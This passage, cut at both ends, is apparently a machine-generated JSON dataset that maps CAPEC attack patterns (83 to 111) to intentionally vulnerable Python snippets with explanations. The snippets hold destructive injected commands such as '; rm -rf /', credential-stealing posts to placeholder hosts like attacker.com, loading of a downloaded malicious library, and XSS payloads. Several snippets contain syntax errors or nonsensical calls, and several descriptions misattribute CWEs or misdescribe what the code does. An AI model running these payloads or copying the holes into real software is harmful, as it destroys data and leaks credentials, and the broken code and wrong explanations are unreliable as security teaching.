        "description": "This Python code snippet demonstrates a vulnerable XML processing function that is susceptible to various XML-based attacks. It lacks XML validation against a proper schema, fails to neutralize special elements, and does not restrict XML external entity references or control recursive entity references in DTDs. This can lead to XML entity expansion, allowing an attacker to inject malicious data or access sensitive information."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef get_user_data(username):\n    tree = ET.parse('users.xml')\n    root = tree.getroot()\n    xpath_expression = \"//user[username='\" + username + \"']\"\n    user_node = root.find(xpath_expression)\n    if user_node is not None:\n        return user_node.find('password').text\n    else:\n        return None\n\nusername = input('Enter your username: ')\npassword = get_user_data(username)\nif password is not None:\n    print('Your password is: ' + password)\nelse:\n    print('User not found')",
        "description": "This code snippet demonstrates XPath Injection (CAPEC) by dynamically constructing an XPath expression using user-controllable input (CWE-643) without proper input validation (CWE-20) or neutralization of special elements (CWE-91, CWE-74, CWE-707). An attacker can inject malicious XPath expressions to bypass authentication or retrieve sensitive information."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef get_data(xml_string, query):\n    root = ET.fromstring(xml_string)\n    return root.find(query)\n\nxml_string = '<root><user>admin</user><password>password123</password></root>'\nquery = input('Enter XQuery: ')\nprint(get_data(xml_string, query))",
        "description": "This Python code snippet is vulnerable to XQuery Injection (CWE-652). It takes user input to construct an XQuery expression, which is then used to retrieve data from an XML string. An attacker can inject malicious XQuery commands to access unauthorized data or execute system commands. This code also relates to CWE-74, CWE-707, CWE-89, and CWE-643, as it does not properly neutralize special elements in the input, allowing for injection attacks."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "import requests\n\najax_app = 'https://example.com/ajax_app'\n\ndef footprint_environment():\n    headers = {'User-Agent': 'Mozilla/5.0'}\n    for port in range(1, 1025):\n        try:\n            response = requests.get(f'http://example.com:{port}', headers=headers, timeout=1)\n            if response.status_code != 404:\n                print(f'Port {port} is open')\n        except requests.exceptions.RequestException:\n            pass\n\n    for path in ['/admin', '/login', '/register', '/search']:  # Incomplete denylist\n        try:\n            response = requests.get(f'{ajax_app}{path}', headers=headers, timeout=1)\n            if response.status_code != 404:\n                print(f'Path {path} is accessible')\n        except requests.exceptions.RequestException:\n            pass\n\nfootprint_environment()",
        "description": "This Python code snippet demonstrates the CAPEC attack by utilizing the conversational pattern of rapid, multiple requests and responses typical in Ajax applications to footprint the target environment. It uses CWE-79 (Improper Neutralization of Input During Web Page Generation) by not validating user input, CWE-20 (Improper Input Validation) by not checking the properties of the input, CWE-116 (Improper Encoding or Escaping of Output) by not encoding the output correctly, CWE-184 (Incomplete List of Disallowed Inputs) by having an incomplete denylist of paths, and CWE-692 (Incomplete Denylist to Cross-Site Scripting) by not covering all possible XSS variants."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "from flask import Flask, request\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    referrer = request.headers.get('Referer')\n    return '<script>alert(\"Referrer: ' + referrer + '\");</script>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable web application that is susceptible to XSS in HTTP Headers attacks. It uses the Flask web framework to create a route that retrieves the 'Referer' HTTP header and injects it into the HTML response without proper validation or sanitization, allowing an attacker to inject malicious scripts."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/admin/delete_user/<username>')\ndef delete_user(username):\n    # No authorization check, allowing forceful browsing\n    return f'User {username} deleted successfully'\n\n@app.route('/user/profile')\ndef user_profile():\n    # Sensitive information in query string\n    username = flask.request.args.get('username')\n    return f'Welcome, {username}!'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "A vulnerable Flask web application that allows forceful browsing and uses GET requests with sensitive query strings. The '/admin/delete_user/<username>' endpoint lacks authorization checks, allowing unauthorized access. The '/user/profile' endpoint retrieves sensitive information from the query string, making it vulnerable to tampering."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import subprocess\n\ndef execute_command(ip_address):\n    command = \"ping -c 1 \" + ip_address\n    subprocess.call(command, shell=True)\n\nevaluate_ip_address = \"8.8.8.8; rm -rf /\"\nexecute_command(evaluate_ip_address)",
        "description": "This Python code snippet is vulnerable to OS command injection. The 'execute_command' function takes an IP address as input and constructs a 'ping' command using the input. The 'subprocess.call' function is used to execute the command. However, the 'shell=True' argument allows the execution of arbitrary shell commands. An attacker can inject malicious commands by providing a specially crafted IP address, such as the 'evaluate_ip_address' variable, which deletes the root directory when executed."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import socket\nimport dns.resolver\n\ndef get_host(ip):\n    try:\n        host = dns.resolver.resolve_address(ip)\n        return str(host)\n    except dns.resolver.NoAnswer:\n        return None\n\nip = '192.168.1.100'\nhost = get_host(ip)\nif host:\n    print(f'The IP {ip} is associated with {host}')\n    # Perform a security-critical action based on the hostname\n    if host == 'trustedbank.com':\n        # Download and execute code from the 'trusted' site\n        exec(socket.gethostbyname(host) + ':8080/trusted_code.py')\nelse:\n    print(f'Failed to resolve {ip} to a hostname')",
        "description": "This code snippet demonstrates a pharming attack by resolving an IP address to a hostname and then performing a security-critical action based on the hostname. It downloads and executes code from the 'trusted' site without properly verifying the origin and integrity of the code, making it vulnerable to CWE-494. The code also relies on reverse DNS resolution for a security-critical action, which is vulnerable to CWE-350. Additionally, it does not properly verify the source of data or communication, making it vulnerable to CWE-346. The code does not neutralize user-controllable input, making it vulnerable to CWE-79. Finally, it relies on the client to implement a mechanism that is intended to protect the server, making it vulnerable to CWE-602."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import socket\nimport hashlib\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-303: Incorrect Implementation of Authentication Algorithm\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-305: Authentication Bypass by Primary Weakness\n# CWE-290: Authentication Bypass by Spoofing\n\ndef authenticate_user(username, password):\n    # Simulating a simple authentication protocol\n    # that is susceptible to reflection attack\n    challenge = hashlib.sha256(username.encode()).hexdigest()\n    response = input(f\"Enter response to challenge {challenge}: \")\n    if response == challenge:\n        return True\n    else:\n        return False\n\n# Simulating a malicious user\n# that can use the target machine to impersonate a trusted user\nmalicious_user_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nmalicious_user_socket.connect((\"target_machine\", 8080))\nmalicious_user_socket.sendall(b\"username\")\nchallenge = malicious_user_socket.recv(1024)\nmalicious_user_socket.sendall(challenge)\nresponse = malicious_user_socket.recv(1024)\nif response == b\"Access Granted\":\n    print(\"Authentication successful\")\nelse:\n    print(\"Authentication failed\")",
        "description": "This Python code snippet demonstrates a vulnerable authentication protocol susceptible to a reflection attack. The authenticate_user function generates a challenge based on the username and expects the user to respond with the same challenge. A malicious user can exploit this by using the target machine to impersonate a trusted user, allowing them to bypass authentication. The code also includes CWE-303, CWE-294, CWE-305, and CWE-290 vulnerabilities, making it prone to incorrect implementation of the authentication algorithm, capture-replay attacks, primary weaknesses, and spoofing attacks."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "img_tag = '<img src=\"javascript:alert(1)\" />'\nprint('<html><body>' + img_tag + '</body></html>')",
        "description": "This code snippet demonstrates a vulnerable Python code that generates an HTML page with an IMG tag containing malicious JavaScript code in the src attribute, which can lead to a Cross-Site Scripting (XSS) attack. The code does not properly neutralize the script in the IMG tag attribute, making it vulnerable to CWE-82. Additionally, it does not filter user-controlled input for executable script, making it vulnerable to CWE-85. The code also does not neutralize special characters that could be interpreted as web-scripting elements, making it vulnerable to CWE-80. Furthermore, the code does not use a complete denylist to defend against XSS attacks, making it vulnerable to CWE-692. Finally, the code does not neutralize alternate script syntax, making it vulnerable to CWE-87."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "def vulnerable_function(size):\n    # CWE-190: Integer Overflow or Wraparound\n    # CWE-680: Integer Overflow to Buffer Overflow\n    buffer_size = size + 100\n    if buffer_size > 0xFFFFFFFF:  # assuming 32-bit system\n        buffer_size = buffer_size % 0xFFFFFFFF\n    buffer = [0] * buffer_size\n    # CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n    # CWE-122: Heap-based Buffer Overflow\n    data = [1] * (size + 100)\n    for i in range(size + 100):\n        buffer[i] = data[i]\n    return buffer\n\n# CWE-196: Unsigned to Signed Conversion Error\n# CWE-697: Incorrect Comparison\nsize = 0xFFFFFFFF - 100\nvulnerable_function(size)\n",
        "description": "This code snippet demonstrates an integer overflow vulnerability. The function vulnerable_function() takes an integer size as input and allocates a buffer of size + 100. However, if size is close to the maximum value, the addition will cause an integer overflow, resulting in a small buffer size. The function then copies data into the buffer without checking the size, leading to a buffer overflow. The code also includes an unsigned to signed conversion error and an incorrect comparison."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import logging\n\n# CWE-117: Improper Output Neutralization for Logs\n# CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element Injection)\n# CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-779: Logging of Excessive Data\n\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\n\ndef log_user_input(user_input):\n    # No input validation or sanitization\n    logging.debug('User input: ' + user_input)\n\ndef log_sensitive_info(username, password):\n    # Logging sensitive information\n    logging.info('Username: ' + username + ', Password: ' + password)\n\ndef log_excessive_data(data):\n    # Logging excessive data\n    logging.debug('Received data: ' + str(data))\n\n# Example usage\nlog_user_input('><script>alert(1)</script>')\nlog_sensitive_info('admin', 'password123')\nlog_excessive_data({'key1': 'value1', 'key2': 'value2', ...})",
        "description": "This Python code snippet demonstrates the CAPEC of log file tampering by injecting malicious log entries. It lacks proper input validation and sanitization, allowing special elements to be injected into the log file. Sensitive information, such as usernames and passwords, is also logged, and excessive data is written to the log file, making it difficult to process and analyze."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import socket\nimport ssl\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-593: Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created\n# CWE-287: Improper Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef vulnerable_communication():\n    # Create a socket object\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    \n    # Wrap the socket with SSL/TLS\n    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\n    ssl_context.check_hostname = False\n    ssl_context.verify_mode = ssl.CERT_NONE\n    ssl_socket = ssl_context.wrap_socket(client_socket, server_hostname='example.com')\n    \n    # CWE-593: Modify the SSL context after connection creation\n    ssl_context.options |= ssl.OP_SINGLE_ECDH_USE\n    \n    # CWE-287: Improper Authentication - no authentication or weak authentication\n    # CWE-294: Authentication Bypass by Capture-replay - no protection against replay attacks\n    ssl_socket.connect(('example.com', 443))\n    \n    # CWE-300: Channel Accessible by Non-Endpoint - no verification of the server's identity\n    # CWE-290: Authentication Bypass by Spoofing - no protection against spoofing attacks\n    data = ssl_socket.recv(1024)\n    print(data.decode('utf-8'))\n    \n    # CWE-294: Authentication Bypass by Capture-replay - replay the captured data\n    ssl_socket.sendall(data)\n    \n    ssl_socket.close()\n\nvulnerable_communication()",
        "description": "This Python code snippet demonstrates a vulnerable communication channel between a client and a server. It lacks proper authentication, allowing an adversary to access the channel, alter or obtain data from transactions, and bypass authentication through spoofing or replay attacks."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nwsdl_file = 'vulnerable_service.wsdl'\n\n# CWE-651: Exposure of WSDL File Containing Sensitive Information\nwsdl_tree = ET.parse(wsdl_file)\nwsdl_root = wsdl_tree.getroot()\n\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\nsensitive_info = {'username': 'admin', 'password': 'password123'}\nwsdl_root.set('credentials', str(sensitive_info))\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\nacl_file = 'acl.xml'\nwith open(acl_file, 'w') as f:\n    f.write('<access_control_list><role>admin</role><permissions>ALL</permissions></access_control_list>')\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nimport requests\n\nsensitive_query_string = {'username': 'admin', 'password': 'password123'}\nresponse = requests.get('http://vulnerable_service.com/login', params=sensitive_query_string)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport platform\n\nsystem_info = {'os': platform.system(), 'release': platform.release(), 'version': platform.version()}\nprint('System Information:', system_info)\n",
        "description": "This Python code snippet demonstrates the CAPEC attack by exposing sensitive information through a WSDL file, access control list files, and system information. It also uses GET requests with sensitive query strings, making it vulnerable to various attacks."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import ctypes\n\n# CWE-589: Call to Non-ubiquitous API\ntry:\n    libc = ctypes.CDLL('non_existent_library.so')\n    libc.non_existent_function()\nexcept OSError:\n    # CWE-1177: Use of Prohibited Code - ignoring the exception\n    pass\n\n# CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\nbuffer = bytearray(10)\nindex = 15\ntry:\n    buffer[index] = 0x01\nexcept IndexError:\n    # CWE-1322: Use of Blocking Code in Single-threaded, Non-backend Context\n    time.sleep(10)  # blocking operation\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nimport urllib.request\nurllib.request.urlretrieve('http://untrusted-source.com/malicious_library.so', 'malicious_library.so')\nctypes.CDLL('./malicious_library.so')",
        "description": "This Python code snippet demonstrates the CAPEC of blocked access to external libraries, leading to potential security vulnerabilities. It includes CWE-589 by calling a non-existent library function, CWE-1177 by ignoring the exception, CWE-119 by accessing an array out of bounds, CWE-1322 by using blocking code in a single-threaded context, and CWE-829 by including functionality from an untrusted source."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import hashlib\nimport os\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# Using a weak hash function like MD5\n\ndef encrypt_data(data):\n    key = 'static_key'  # CWE-1240: Use of a Cryptographic Primitive with a Risky Implementation\n    iv = 'static_iv'  # CWE-1204: Generation of Weak Initialization Vector (IV)\n    cipher = hashlib.md5(key.encode() + iv.encode()).digest()\n    encrypted_data = bytearray()\n    for i in range(len(data)):\n        encrypted_data.append(data[i] ^ cipher[i % len(cipher)])\n    return encrypted_data\n\n# CWE-1241: Use of Predictable Algorithm in Random Number Generator\n# Using a predictable random number generator\n\ndef generate_random_number):\n    return int(os.urandom(4).encode('hex'), 16) % 100\n\n# CWE-1279: Cryptographic Operations are run Before Supporting Units are Ready\n# Performing cryptographic operations without ensuring that the supporting inputs are ready\n\ndef main):\n    data = b'Hello, World!'\n    encrypted_data = encrypt_data(data)\n    random_number = generate_random_number()\n    if random_number < 50:\n        print('Encryption successful!')\n    else:\n        print('Encryption failed!')\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates the CAPEC of Cryptanalysis by using a broken or risky cryptographic algorithm (CWE-327), generating weak initialization vectors (CWE-1204), using a cryptographic primitive with a risky implementation (CWE-1240), using a predictable algorithm in a random number generator (CWE-1241), and performing cryptographic operations before supporting units are ready (CWE-1279). The code encrypts data using a weak hash function like MD5 and a static key and IV, and then uses a predictable random number generator to determine the success of the encryption."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import requests\n\ndef phishing_attack(url, malicious_url):\n    # CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n    response = requests.get(url, allow_redirects=True)\n    if response.status_code == 302:\n        # CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        print('You are being redirected to:', response.headers['Location'])\n        # CWE-506: Embedded Malicious Code / CWE-507: Trojan Horse\n        if 'malicious_code' in response.text:\n            # CWE-512: Spyware\n            user_data = {'username': 'victim', 'password': 'password123'}\n            requests.post(malicious_url, data=user_data)\n\nphishing_attack('http://example.com/login', 'http://malicious.com/steal_credentials')",
        "description": "This Python code snippet demonstrates a phishing attack by redirecting the user to a malicious website, stealing their credentials, and sending them to the attacker. It utilizes CWE-601 to redirect the user, CWE-451 to misrepresent critical information, CWE-506/CWE-507 to embed malicious code, and CWE-512 to collect personally identifiable information."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml(xml_string):\n    try:\n        root = ET.fromstring(xml_string)\n        # No validation against a schema\n        # No restriction on external entity references\n        # No neutralization of special XML elements\n        return root.find(\"./user\").text\n    except ET.ParseError:\n        return \"Error parsing XML\"\n\n# Example usage:\nxml_string = \"<?xml version='1.0'?><user><username>admin</username></user>\"\nprint(process_xml(xml_string))",
        "description": "This Python code snippet demonstrates a vulnerable XML processing function that is susceptible to XML injection, missing XML validation, and improper restriction of XML external entity references. The function does not validate the input XML against a schema, does not restrict external entity references, and does not neutralize special XML elements, making it vulnerable to various XML-based attacks."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "def vulnerable_function(user_input):\n    buffer = bytearray(10)\n    for i in range(len(user_input)):\n        buffer[i] = user_input[i]\n    return buffer\n\nuser_input = 'A' * 20\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a classic buffer overflow vulnerability. The function `vulnerable_function` takes a user input and copies it into a fixed-size buffer without checking the size of the input, leading to a buffer overflow. This is an example of CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow'). The function uses an untrusted input to calculate an array index without validation, which is CWE-129: Improper Validation of Array Index. Additionally, the function does not correctly calculate the size to be used when allocating the buffer, which is CWE-131: Incorrect Calculation of Buffer Size. The code also accesses the buffer with an incorrect length value, which is CWE-805: Buffer Access with Incorrect Length Value. Finally, the code is susceptible to CWE-680: Integer Overflow to Buffer Overflow if the input size is large enough to cause an integer overflow."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "import os\n\ndef vulnerable_ssiInjection(url):\n    ssi_injection = \"<!--#exec cmd='ls'-->\"\n    os.system(\"echo \" + ssi_injection + \" > ssi_test.shtml\")\n    return \"http://\" + url + \"/ssi_test.shtml\"\n\nurl = \"localhost\"\nprint(vulnerable_ssiInjection(url))",
        "description": "This Python code snippet demonstrates Server-Side Include (SSI) Injection vulnerability. It creates a malicious SSI directive that executes the 'ls' command on the server and saves it to an .shtml file. The file is then served by the web server, allowing the attacker to execute arbitrary system commands. This code embodies CWE-97, CWE-74, CWE-20, CWE-602, and CWE-433."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import socket\nimport http.client\n\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-522: Insufficiently Protected Credentials\n# CWE-523: Unprotected Transport of Credentials\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n\ndef sniff_traffic():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('localhost', 8080))\n    sock.listen(1)\n    conn, addr = sock.accept()\n    print('Connected by', addr)\n    while True:\n        data = conn.recv(1024)\n        if not data:\n            break\n        print('Received:', repr(data))\n        # Capture session token\n        if b'session_token' in data:\n            session_token = data.split(b'=')[1]\n            print('Captured session token:', session_token)\n            # Replay the session token to impersonate the victim\n            conn.sendall(b'HTTP/1.1 200 OK\\r\\n')\n            conn.sendall(b'Set-Cookie: session_token=' + session_token + b';\\r\\n')\n            conn.sendall(b'\\r\\n')\n            break\n\nif __name__ == '__main__':\n    sniff_traffic()",
        "description": "This code snippet demonstrates a session sidejacking attack, where an attacker sniffs traffic on a network to capture a session token. The attacker then replays the captured token to impersonate the victim. The code uses Python's socket library to create a server that listens for incoming connections. When a connection is established, it receives data from the client and checks if it contains a session token. If a token is found, it is captured and replayed back to the client to impersonate the victim. This code embodies the CWEs related to session sidejacking, including authentication bypass by capture-replay, insufficiently protected credentials, unprotected transport of credentials, cleartext transmission of sensitive information, and sensitive cookie in HTTPS session without the 'Secure' attribute."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "import tkinter as tk\nfrom tkinter import ttk\n\nclass MaliciousApp:\n    def __init__(self, master):\n        self.master = master\n        self.frame = ttk.Frame(self.master)\n        self.frame.pack()\n        self.button = ttk.Button(self.frame, text=\"Click me\", command=self.victim_interaction)\n        self.button.pack()\n\n    def victim_interaction(self):\n        # CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n        # Create a new frame that looks like a login form\n        login_frame = ttk.Frame(self.master)\n        login_frame.pack()\n        ttk.Label(login_frame, text=\"Enter credentials:\").pack()\n        ttk.Entry(login_frame).pack()\n        ttk.Button(login_frame, text=\"Login\", command=self.steal_credentials).pack()\n\n    def steal_credentials(self):\n        # CWE-368: Context Switching Race Condition\n        # Switch to a new context to steal credentials\n        import threading\n        threading.Thread(target=self.send_credentials_to_attacker).start()\n\n    def send_credentials_to_attacker(self):\n        # CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n        # Send credentials to the attacker via a nested call\n        import requests\n        requests.post(\"https://attacker.com/steal\", data={\"credentials\": \"stolen\"})\n\n    def malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        # Execute malicious code\n        import os\n        os.system(\"rm -rf /\")\n\n    def misinterpret_input(self):\n        # CWE-115: Misinterpretation of Input\n        # Misinterpret user input\n        user_input = input(\"Enter a number: \")\n        if user_input == \"1\":\n            self.malicious_code()\n\nroot = tk.Tk()\napp = MaliciousApp(root)\nroot.mainloop()",
        "description": "This Python code snippet demonstrates the CAPEC of tricking a victim into unknowingly initiating an action in one system while interacting with the UI from a seemingly different system. The code creates a malicious application with a button that, when clicked, creates a new frame that looks like a login form. When the user enters credentials and clicks the login button, the application steals the credentials and sends them to the attacker. The code also includes examples of CWE-368, CWE-1265, CWE-506, and CWE-115."
    },
    {
        "capec_id": "104",
        "capec_name": "Cross Zone Scripting",
        "code_snippet": "import os\n\n# CWE-250: Execution with Unnecessary Privileges\n# CWE-638: Not Using Complete Mediation\n# CWE-285: Improper Authorization\n\ndef elevated_privileges():\n    # Run with administrator privileges\n    os.setuid(0)\n    # CWE-116: Improper Encoding or Escaping of Output\n    user_input = input('Enter a command: ')\n    # CWE-20: Improper Input Validation\n    if user_input:\n        # Execute the user input as a system command\n        os.system(user_input)\n\n# CWE-250: Execution with Unnecessary Privileges\nelevated_privileges()\n",
        "description": "This Python code snippet demonstrates a privilege elevation attack by executing user input as a system command with administrator privileges, bypassing security zone controls. It embodies the main idea of the CAPEC by violating CWE-250, CWE-638, CWE-285, CWE-116, and CWE-20."
    },
    {
        "capec_id": "105",
        "capec_name": "HTTP Request Splitting",
        "code_snippet": "import http.server\nimport socketserver\n\nPORT = 8000\n\nclass RequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n        # CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n        # CWE-138: Improper Neutralization of Special Elements\n        # CWE-436: Interpretation Conflict\n        # CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        user_input = self.rfile.readline().decode('utf-8').strip()\n        if 'HTTP/1.1' in user_input:\n            # Split the HTTP request into multiple unauthorized and malicious HTTP requests\n            malicious_request = 'GET /admin HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n'\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(malicious_request.encode())\n        else:\n            self.send_response(400)\n            self.end_headers()\n            self.wfile.write(b'Bad Request')\n\nwith socketserver.TCPServer(('', PORT), RequestHandler) as httpd:\n    print(f'Serving at port {PORT}')\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates the CAPEC of HTTP Request Smuggling. It creates an HTTP server that accepts GET requests and splits them into multiple unauthorized and malicious HTTP requests to a back-end HTTP agent. The code exploits the discrepancies in parsing and interpretation of HTTP Request messages by different intermediary HTTP agents, such as load balancers, reverse proxies, web caching proxies, and application firewalls. The code is vulnerable to CWE-74, CWE-113, CWE-138, CWE-436, and CWE-444."
    },
    {
        "capec_id": "106",
        "capec_name": "DEPRECATED: XSS through Log Files",
        "code_snippet": "import logging\n\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\ndef generate_webpage(user_input):\n    webpage = '<img src=\"' + user_input + '\" />\n    return webpage\n\nuser_input = '<script>alert(\"XSS\")</script>'\nlogging.info('User input: ' + user_input)\nwebpage = generate_webpage(user_input)\nprint(webpage)\n",
        "description": "This code snippet demonstrates a vulnerable web application that is susceptible to Cross-Site Scripting (XSS) attacks. The generate_webpage function takes user input and injects it into an HTML IMG tag without proper sanitization, allowing an attacker to inject malicious scripts. The logging mechanism also logs the user input without proper filtering, making it vulnerable to log injection attacks."
    },
    {
        "capec_id": "107",
        "capec_name": "Cross Site Tracing",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET', 'POST'])\ndef vulnerable():\n    if flask.request.method == 'POST':\n        html = '<html><body><h1>You sent: ' + flask.request.form['user_input'] + '</h1></body></html>'\n        return html\n\n    return '<form action=\"/vulnerable\" method=\"post\"><input type=\"text\" name=\"user_input\"/><input type=\"submit\"/></form>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable Flask web application that is susceptible to Cross-Site Tracing (XST) and other related vulnerabilities. The application does not properly validate user input, allowing for Cross-Site Scripting (CWE-79) and potential Cross-Site Request Forgery (CWE-352) attacks. The lack of protection mechanisms and incorrect use of privileged APIs (CWE-648) further exacerbate the vulnerabilities. The incomplete denylist (CWE-692) and failure to use sufficient defense mechanisms (CWE-693) make the application vulnerable to various attacks."
    },
    {
        "capec_id": "108",
        "capec_name": "Command Line Execution through SQL Injection",
        "code_snippet": "import os\nimport sqlite3\n\ndef inject_sql(malicious_input):\n    conn = sqlite3.connect('database.db')\n    c = conn.cursor()\n    c.execute(\"INSERT INTO commands (command) VALUES ('\" + malicious_input + \"')\")\n    conn.commit()\n    conn.close()\n\n\ndef execute_command_from_db():\n    conn = sqlite3.connect('database.db')\n    c = conn.cursor()\n    c.execute(\"SELECT command FROM commands\")\n    row = c.fetchone()\n    if row:\n        os.system(row[0])\n    conn.close()\n\ninject_sql(\"; rm -rf /\")\nexecute_command_from_db()",
        "description": "This Python code snippet demonstrates the CAPEC of SQL injection leading to OS command injection. The `inject_sql` function injects malicious input into a SQLite database, and the `execute_command_from_db` function retrieves the injected command and executes it using `os.system`. The CWEs embodied in this code snippet include CWE-89 (SQL injection), CWE-74 (injection), CWE-20 (improper input validation), CWE-78 (OS command injection), and CWE-114 (process control)."
    },
    {
        "capec_id": "109",
        "capec_name": "Object Relational Mapping Injection",
        "code_snippet": "from sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\n\nengine = create_engine('postgresql://user:password@localhost/dbname')\nSession = sessionmaker(bind=engine)\n\nsession = Session()\n\nusername = request.form['username']\npassword = request.form['password']\n\nquery = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"\n\nresult = session.execute(query)\n\nif result.rowcount > 0:\n    print(\"Login successful\")\nelse:\n    print(\"Invalid credentials\")",
        "description": "This code snippet demonstrates a vulnerable Python code using SQLAlchemy ORM that is susceptible to SQL injection. The code constructs a dynamic SQL query using user-controlled input from the request form, which can be manipulated by an attacker to inject malicious SQL commands. This code violates CWE-20 (Improper Input Validation), CWE-89 (Improper Neutralization of Special Elements used in an SQL Command), CWE-564 (SQL Injection: Hibernate), CWE-943 (Improper Neutralization of Special Elements in Data Query Logic), and CWE-1083 (Data Access from Outside Expected Data Manager Component)."
    },
    {
        "capec_id": "110",
        "capec_name": "SQL Injection through SOAP Parameter Tampering",
        "code_snippet": "import soapclient\nfrom soapclient import SOAPProxy\n\nsoap = SOAPProxy('http://example.com/service')\n\ndef get_user(username):\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n    return soap.execute_query(query)\n\nusername = input('Enter username: ')\nget_user(username)\n",
        "description": "This Python code snippet demonstrates a SQL injection vulnerability through a SOAP message. The get_user function takes a username as input and constructs a SQL query to retrieve the user's information. The query is then executed through a SOAP service without proper input validation or parameter binding, allowing an attacker to inject malicious SQL code."
    },
    {
        "capec_id": "111",
        "capec_name": "JSON Hijacking (aka JavaScript Hijacking)",
